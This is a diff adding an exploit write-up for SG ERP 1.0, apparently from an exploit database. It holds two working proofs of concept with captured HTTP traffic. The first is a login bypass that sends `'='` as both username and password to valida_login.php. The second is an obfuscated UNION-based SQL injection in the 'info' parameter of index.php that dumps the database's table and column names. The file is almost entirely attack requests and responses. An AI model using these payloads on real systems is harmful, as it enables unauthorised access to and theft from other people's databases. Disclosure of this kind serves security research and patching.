@@ -1,0 +1,89 @@
+# Exploit Title: SG ERP 1.0 - 'info' SQL Injection
+# Dork: N/A
+# Date: 2018-10-24
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://fankstribe.org/
+# Software Link: https://sourceforge.net/projects/sgerp/files/latest/download
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/valida_login.php
+# 
+# [PATH]/valida_login.php
+# 
+# 05 $login = @$_POST['login'];
+# 06 $senha = @$_POST['senha'];
+  
+# POST /[PATH]/valida_login.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=dvctab6luqcp739fom5asvqru7
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 19
+login='='&senha='='
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 15:43:47 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 46
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+# http://localhost/[PATH]/index.php
+GET /ExploitDb/GP%20ERP/index.php HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/[PATH]/valida_login.php
+Cookie: PHPSESSID=dvctab6luqcp739fom5asvqru7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 15:43:47 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Length: 1950
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/index.php?mod=est&bot=tes3&info=[SQL]
+ 
+GET /[PATH]/index.php?mod=est&bot=tes3&info=-4++uniOn++selecT+0x496873616e%2c0x496873616e%2c(selECt(@x)fROm(selECt(@x:=0x00)%2c(@rUNNing_nuMBer:=0)%2c(@tbl:=0x00)%2c(selECt(0)fROm(infoRMATion_schEMa.coLUMns)wHEre(tABLe_schEMa=daTABase())aNd(0x00)in(@x:=Concat(@x%2cif((@tbl!=tABLe_name)%2cConcat(LPAD(@rUNNing_nuMBer:=@rUNNing_nuMBer%2b1%2c2%2c0x30)%2c0x303d3e%2c@tBl:=tABLe_naMe%2c(@z:=0x00))%2c%200x00)%2clpad(@z:=@z%2b1%2c2%2c0x30)%2c0x3d3e%2c0x4b6f6c6f6e3a20%2ccolumn_name%2c0x3c62723e))))x)%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e-- HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=dvctab6luqcp739fom5asvqru7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Wed, 24 Oct 2018 15:50:17 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
